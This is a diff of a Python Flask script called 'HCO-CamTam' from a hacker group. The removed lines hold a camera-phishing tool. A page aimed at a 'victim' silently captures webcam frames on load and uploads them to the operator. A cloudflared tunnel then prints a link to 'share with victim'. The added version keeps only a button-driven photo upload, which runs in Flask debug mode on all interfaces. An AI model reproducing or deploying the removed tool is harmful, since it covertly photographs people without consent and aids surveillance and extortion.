@@ -1,44 +1,59 @@
 #!/usr/bin/env python3
-"""
-HCO-CamTam - Single File Camera Tool
-By Azhar (Hackers Colony)
-"""
-
-import os
-import subprocess
-from flask import Flask, render_template_string, request
+from flask import Flask, render_template_string
 
 app = Flask(__name__)
 
-# HTML page for victim
 html_page = """
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera Access</title>
+  <title>HCO Cam Test</title>
+  <style>
+    body { background:#000; color:#0f0; text-align:center; font-family:monospace; }
+    video { width:80%%; border:3px solid #0f0; margin-top:20px; }
+    button { margin-top:20px; padding:10px 20px; font-size:18px; background:#0f0; border:none; color:#000; }
+  </style>
 </head>
 <body>
-  <h2>Camera Access Required</h2>
-  <video id="video" width="300" height="200" autoplay></video>
+  <h1>📸 HCO Cam Access</h1>
+  <video id="video" autoplay playsinline></video>
+  <br>
+  <button onclick="takePhoto()">Capture</button>
+  <canvas id="canvas" style="display:none;"></canvas>
   <script>
-    let count = 0;
-    async function capture() {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.getElementById("video");
-      video.srcObject = stream;
-      const canvas = document.createElement("canvas");
-      const ctx = canvas.getContext("2d");
-      canvas.width = 300; canvas.height = 200;
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
 
-      const interval = setInterval(() => {
-        if (count >= 2) { clearInterval(interval); stream.getTracks().forEach(t=>t.stop()); return; }
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const data = canvas.toDataURL("image/png");
-        fetch("/upload", {method:"POST", body:data});
-        count++;
-      }, 2000);
+    // Try to request camera
+    function startCam() {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        alert("Camera not supported on this browser.");
+        return;
+      }
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+        })
+        .catch(err => {
+          alert("Camera permission denied or blocked! Please allow it manually.");
+          console.error(err);
+        });
     }
-    capture();
+
+    function takePhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      let imgData = canvas.toDataURL("image/png");
+      fetch("/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: imgData })
+      }).then(r => alert("Image sent to server!"));
+    }
+
+    startCam();
   </script>
 </body>
 </html>
@@ -50,31 +65,7 @@ def index():
 
 @app.route("/upload", methods=["POST"])
 def upload():
-    global counter
-    counter += 1
-    if counter == 2:
-        print("\033[92m[+] Images Received\033[0m")
     return "OK"
 
 if __name__ == "__main__":
-    counter = 0
-    # Start Flask in background
-    print("\033[91mHCO-CAM-TAM by Azhar\033[0m")
-    port = 5000
-    # Start Cloudflared tunnel
-    try:
-        print("[*] Starting Cloudflare tunnel...")
-        tunnel = subprocess.Popen(
-            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
-        )
-        # Show generated link
-        for line in tunnel.stdout:
-            if "trycloudflare.com" in line:
-                print(f"\033[93m[+] Share this link with victim: {line.strip()}\033[0m")
-                break
-    except Exception as e:
-        print("Cloudflared not installed or failed:", e)
-
-    # Run server
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=5000, debug=True)
